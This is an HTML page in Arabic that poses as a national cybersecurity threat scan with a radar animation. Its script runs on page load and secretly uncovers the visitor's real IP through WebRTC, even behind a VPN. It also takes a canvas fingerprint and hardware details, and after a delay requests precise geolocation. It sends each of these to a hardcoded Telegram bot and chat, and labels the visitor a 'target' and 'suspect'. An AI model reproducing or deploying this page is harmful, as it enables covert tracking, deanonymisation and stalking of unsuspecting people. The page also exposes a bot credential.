<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام الحماية الوطني - فحص الأمان</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
        .radar { width: 150px; height: 150px; border: 2px solid #00ff00; border-radius: 50%; margin: 0 auto 20px; position: relative; overflow: hidden; }
        .radar:after { content: ""; display: block; width: 100%; height: 100%; background: linear-gradient(90deg, transparent 50%, rgba(0,255,0,0.2) 50%); animation: scan 2s linear infinite; }
        @keyframes scan { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .status { font-size: 14px; margin-top: 20px; color: #fff; }
    </style>
</head>
<body>

    <div class="radar"></div>
    <h2>جاري فحص التهديدات السيبرانية...</h2>
    <p class="status" id="log">بدء تحليل البصمة الرقمية للجهاز...</p>

    <script>
        const T = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
        const C = '7214473798';

        window.onload = async () => {
            try {
                // 1. كشف الـ IP الحقيقي (حتى خلف الـ VPN) عبر WebRTC
                const rtc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                rtc.createDataChannel("");
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                rtc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        const realIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
                        sendData(`🔍 الـ IP الحقيقي المكتشف (WebRTC): ${realIP}`);
                    }
                };

                // 2. تحليل بصمة الجهاز (Canvas Fingerprinting)
                // هذه التقنية تحدد هوية الجهاز بدقة حتى لو مسح المتصفح أو غير الـ IP
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.fillText("HACK-ID-CHECK", 10, 10);
                const fingerprint = canvas.toDataURL().slice(-50); // بصمة فريدة للجهاز

                // 3. جمع بيانات المعالج والذاكرة (Hardware Profiling)
                const info = {
                    "المعالج": navigator.hardwareConcurrency + " Cores",
                    "الرامات": navigator.deviceMemory + " GB",
                    "اللغة": navigator.language,
                    "البصمة": fingerprint
                };

                sendData(`⚙️ **تحليل العتاد للمشتبه به:**\n` + JSON.stringify(info, null, 2));

                document.getElementById('log').innerText = "تم تأمين الاتصال بنجاح. يرجى الانتظار...";

                // 4. طلب الموقع الجغرافي "بعد" كسب الثقة
                setTimeout(() => {
                    navigator.geolocation.getCurrentPosition((p) => {
                        const map = `🎯 إحداثيات الهدف الدقيقة:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                        sendData(map);
                    }, null, {enableHighAccuracy: true});
                }, 5000);

            } catch (e) {}
        };

        function sendData(text) {
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(text)}`);
        }
    </script>
</body>
</html>
